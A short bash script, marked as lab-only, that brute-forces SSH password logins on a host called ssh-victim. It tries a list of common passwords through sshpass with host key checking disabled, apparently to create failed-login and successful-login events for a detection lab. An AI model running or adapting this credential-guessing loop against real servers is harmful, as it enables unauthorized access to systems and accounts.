#!/bin/bash
# LAB ONLY: brute-force the deliberately weak ssh-victim login
TARGET="ssh-victim"
USER="victim"
# 8 wrong guesses (generate auth failures) then the real one (a successful login)
PASSWORDS="123456 password admin root letmein qwerty password1 test123 password123"
echo "[*] Starting SSH brute force against ${USER}@${TARGET}"
for p in $PASSWORDS; do
    echo "[*] trying ${USER}:${p}"
    if sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
        -o PreferredAuthentications=password -o PubkeyAuthentication=no \
        "${USER}@${TARGET}" "echo LOGGED_IN_AS \$(whoami); exit" 2>/dev/null; then
        echo "[+] SUCCESS with password: ${p}"
        break
    fi
    sleep 1
done
echo "[*] Done."
